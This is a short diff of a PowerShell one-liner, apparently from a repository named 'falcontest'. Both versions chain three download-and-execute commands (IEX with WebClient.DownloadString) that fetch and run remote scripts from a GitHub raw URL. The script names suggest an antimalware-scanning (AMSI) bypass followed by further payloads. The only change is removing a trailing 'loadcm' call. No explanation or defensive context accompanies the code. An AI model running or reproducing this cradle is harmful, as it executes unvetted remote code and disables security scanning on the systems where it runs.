@@ -1,2 +1,1 @@
-IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/St3v3a/falcontest/master/amsi.txt'); IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/St3v3a/falcontest/master/refkill.txt'); IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/St3v3a/falcontest/master/loadcm.txt');
-loadcm
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/St3v3a/falcontest/master/amsi.txt'); IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/St3v3a/falcontest/master/refkill.txt'); IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/St3v3a/falcontest/master/loadcm.txt')
